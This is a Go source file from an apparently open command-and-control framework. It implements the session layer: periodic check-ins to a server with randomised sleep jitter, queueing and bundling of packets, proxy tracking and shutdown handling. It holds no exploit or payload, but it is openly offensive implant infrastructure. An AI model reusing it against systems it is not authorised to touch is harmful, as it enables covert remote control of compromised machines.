package c2

import (
	"bytes"
	"context"
	"errors"
	"math"
	"math/rand"
	"time"

	"github.com/iDigitalFlame/xmt/xmt/com"
	"github.com/iDigitalFlame/xmt/xmt/device"
	"github.com/iDigitalFlame/xmt/xmt/util"
)

var (
	// ErrFullBuffer is returned from the WritePacket function when the send buffer for
	// Session is full.
	ErrFullBuffer = errors.New("cannot add a Packet to a full send buffer")

	jitterMin int8
	jitterMax int8 = 100
)

// Session is a struct that represents a connection between the client and
// the Listener. This struct does some automatic handeling and acts as the
// communication channel between the client and server.
type Session struct {
	ID       device.ID
	Mux      Mux
	Last     time.Time
	Sleep    time.Duration
	Jitter   int8
	Update   func(*Session)
	Device   *device.Machine
	Created  time.Time
	Receive  func(*Session, *com.Packet)
	Released func(*Session)

	ctx        context.Context
	new        chan *proxyClient
	del        chan uint32
	send       chan *com.Packet
	recv       chan *com.Packet
	wake       chan bool
	frags      map[uint16]*com.Packet
	errors     int8
	server     string
	cancel     context.CancelFunc
	parent     *Handle
	proxies    map[uint32]*proxyClient
	connect    func(string) (Connection, error)
	wrapper    Wrapper
	transform  Transform
	controller *Server
}

// Wake will interrupt the sleep of the current
// session thread. This will trigger the send and receive functions
// of this Session.
func (s *Session) Wake() {
	if len(s.wake) < cap(s.wake) {
		s.wake <- true
	}
}
func (s *Session) wait() {
	if s.Sleep == 0 {
		return
	}
	t := s.Sleep
	if s.Jitter > jitterMin && s.Jitter < jitterMax {
		if int8(rand.Int31n(int32(jitterMax))) < s.Jitter && t > time.Millisecond {
			d := rand.Int63n(int64(t / time.Millisecond))
			if rand.Int31n(2) == 1 {
				d = d * -1
			}
			t += (time.Duration(d) * time.Millisecond)
			if t < 0 {
				t = time.Duration(math.Abs(float64(t)))
			}
		}
	}
	x, w := context.WithTimeout(s.ctx, t)
	select {
	case <-s.wake:
		break
	case <-x.Done():
		break
	case <-s.ctx.Done():
		break
	}
	w()
}

// Wait will block until the current session
// is closed and shutdown.
func (s *Session) Wait() {
	<-s.ctx.Done()
}
func (s *Session) listen() {
	s.controller.Log.Trace("[%s] Starting transaction thread...", s.ID)
	for ; s.ctx.Err() == nil; s.wait() {
		s.controller.Log.Trace("[%s] Waking up...", s.ID)
		if len(s.del) > 0 {
			for x := 0; x < len(s.del); x++ {
				delete(s.proxies, <-s.del)
			}
		}
		if len(s.new) > 0 {
			var n *proxyClient
			for x := 0; x < len(s.new); x++ {
				n = <-s.new
				s.proxies[n.hash] = n
			}
		}
		c, err := s.connect(s.server)
		if err != nil {
			s.controller.Log.Warning("[%s] Received an error attempting to connect to \"%s\"! (%s)", s.ID, s.server, err.Error())
			if s.errors > 0 {
				s.errors--
				continue
			}
			break
		}
		s.controller.Log.Trace("[%s] Connected to \"%s\"...", s.ID, s.server)
		if err := s.peek(c); err != nil {
			s.controller.Log.Warning("[%s] Received an error attempting to write to \"%s\"! (%s)", s.ID, s.server, err.Error())
			c.Close()
			continue
		}
		p, err := read(c, s.wrapper, s.transform)
		if err != nil {
			s.controller.Log.Warning("[%s] Received an error attempting to read from \"%s\"! (%s)", s.ID, s.server, err.Error())
			c.Close()
			continue
		}
		if p == nil || p.IsEmpty() {
			s.controller.Log.Warning("[%s] Received an empty packet from \"%s\"!", s.ID, s.server)
			c.Close()
			continue
		}
		if err := process(s.parent, s, p); err != nil {
			s.controller.Log.Warning("[%s] Received an error processing packet data from \"%s\"! (%s)", s.ID, s.server, err.Error())
			c.Close()
			continue
		}
		c.Close()
	}
	s.controller.events <- &callback{
		session:     s,
		sessionFunc: s.Released,
	}
	s.controller.Log.Trace("[%s] Stopping transaction thread...", s.ID)
	s.Close()
}

// Shutdown indicates that the client should gracefully
// shutdown and release resources. This will not close the session until
// the client acknowledges and sends the response to this packet.
func (s *Session) Shutdown() {
	s.WritePacket(&com.Packet{ID: MsgShutdown, Device: s.Device.ID, Job: 1})
}

// Close stops the listening thread from this Session and
// releases all associated resources.
func (s *Session) Close() error {
	defer func() { recover() }()
	s.cancel()
	if s.parent != nil && s.parent.ctx.Err() == nil {
		s.parent.close <- s.Device.ID.Hash()
	}
	if s.del != nil {
		close(s.del)
		close(s.new)
	}
	close(s.send)
	close(s.recv)
	if s.wake != nil {
		close(s.wake)
	}
	return nil
}

// IsProxy returns true when a Proxy has been attached to this Session and is active.
func (s *Session) IsProxy() bool {
	return s.proxies != nil && len(s.proxies) > 0
}

// String returns the ID of this Session.
func (s *Session) String() string {
	return s.ID.FullString()
}

// IsActive returns true if this Session is
// still able to send and receive Packets.
func (s *Session) IsActive() bool {
	return s.ctx.Err() == nil
}

// IsClient returns true when this Session is not associated to
// a Handle on this end, which signifies that this session is Client initiated.
func (s *Session) IsClient() bool {
	return s.parent == nil
}

// Times sets the wake/sleep values in the form of
// Sleep (in seconds) and JItter.  If the values are
// -1 or outside the standard range, the given values will
// be ignored.
func (s *Session) Times(t, j int) {
	if t > 0 {
		s.Sleep = time.Second * time.Duration(t)
	}
	if int8(j) >= jitterMin && int8(j) < jitterMax {
		s.Jitter = int8(j)
	}
}

// ReadPacket attempts to grab a Packet from the receiving
// buffer. This functions nil if there the buffer is empty.
func (s *Session) ReadPacket() *com.Packet {
	if len(s.recv) > 0 {
		if p, ok := <-s.recv; ok {
			return p
		}
	}
	return nil
}
func (s *Session) peek(i Connection) error {
	select {
	case <-s.ctx.Done():
		return s.ctx.Err()
	default:
	}
	v, err := next(s.send, s.Device.ID)
	if err != nil {
		return err
	}
	s.controller.Log.Trace("[%s] Sending Packet \"%s\" to \"%s\".", s.ID, v.String(), s.server)
	if err := write(i, s.wrapper, s.transform, v); err != nil {
		return err
	}
	return nil
}

// WritePacket adds the supplied Packet into the stack to be sent to the server
// on next wake. This call is asynchronous and returns immediately.  The only error may be
// returned if the send buffer is full.
func (s *Session) WritePacket(p *com.Packet) error {
	if len(s.send) == cap(s.send) {
		return ErrFullBuffer
	}
	s.send <- p
	return nil
}
func next(c chan *com.Packet, i device.ID) (*com.Packet, error) {
	if len(c) == 0 {
		return &com.Packet{ID: MsgSleep, Device: i}, nil
	}
	var p *com.Packet
	if len(c) == 1 {
		p = <-c
		if p.Job == 0 {
			p.Job = uint16(util.Rand.Uint32())
		}
		if p.Device == nil {
			p.Device = i
			return p, nil
		} else if bytes.Equal(p.Device, i) {
			return p, nil
		}
	}
	m := &com.Packet{ID: MsgMultiple, Device: i}
	var t int
	var x, a bool
	if p != nil {
		t++
		x = true
		if err := p.MarshalStream(m); err != nil {
			return nil, err
		}
		p.ResetFull()
	}
	for ; len(c) > 0 && t < com.MaxAutoMultiSize; t++ {
		p = <-c
		if p.Job == 0 {
			p.Job = uint16(util.Rand.Uint32())
		}
		if p.Device == nil {
			a = true
			p.Device = i
		} else if !bytes.Equal(p.Device, i) {
			x = true
		} else {
			a = true
		}
		if err := p.MarshalStream(m); err != nil {
			return nil, err
		}
		p.ResetFull()
	}
	if !a {
		t++
		x = true
		p = &com.Packet{ID: MsgSleep, Device: i}
		if err := p.MarshalStream(m); err != nil {
			return nil, err
		}
	}
	m.Close()
	m.Flags |= com.FlagMulti
	if x {
		m.Flags |= com.FlagMultiDevice
	}
	m.Flags.SetFragTotal(uint16(t))
	return m, nil
}
